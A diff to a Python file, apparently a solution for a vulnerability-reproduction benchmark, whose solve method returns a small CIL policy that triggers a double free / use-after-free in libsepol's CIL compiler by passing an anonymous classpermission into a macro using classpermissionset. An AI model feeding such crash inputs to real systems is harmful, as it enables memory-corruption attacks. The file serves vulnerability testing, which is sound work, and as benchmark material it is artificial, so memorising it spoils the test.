@@ -1,24 +1,26 @@
-import sys
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generate a PoC that triggers the Heap Use After Free vulnerability in libsepol/cil.
         
-        The vulnerability corresponds to a double free in libsepol/cil when an 
-        anonymous classpermission is passed into a macro that uses a classpermissionset rule.
+        The vulnerability is triggered when an anonymous classpermission is passed as an argument
+        to a macro, and that argument is used in a classpermissionset rule within the macro.
+        This results in the anonymous classpermission being destroyed twice during AST destruction.
         """
-        # CIL policy to trigger CVE-2023-45862 (or related anonymous classpermission double free)
-        # 1. Define a class 'c' with permission 'p'.
-        # 2. Define a macro 'm' accepting a 'classpermission' argument 'a'.
-        # 3. Inside the macro, use 'classpermissionset' on 'a'.
-        # 4. Call the macro 'm' with an anonymous classpermission '(c (p))'.
-        
-        poc = (
-            b"(class c (p))\n"
-            b"(macro m ((classpermission a))\n"
-            b" (classpermissionset a (c (p)))\n"
-            b")\n"
-            b"(call m ((c (p))))\n"
+        # Define a minimal CIL policy
+        # 1. Declare a class 'c' and permission 'p'
+        # 2. Define a macro 'm' taking a classpermission 'arg'
+        # 3. Inside macro, use 'arg' in a classpermissionset statement
+        # 4. Call macro 'm' with an anonymous classpermission '(c (p))'
+        cil_poc = (
+            "(class c (p))\n"
+            "(classorder (c))\n"
+            "(macro m ((classpermission arg))\n"
+            "    (classpermissionset arg (c (p)))\n"
+            ")\n"
+            "(call m ((c (p))))\n"
         )
-        return poc
+        
+        return cil_poc.encode('utf-8')
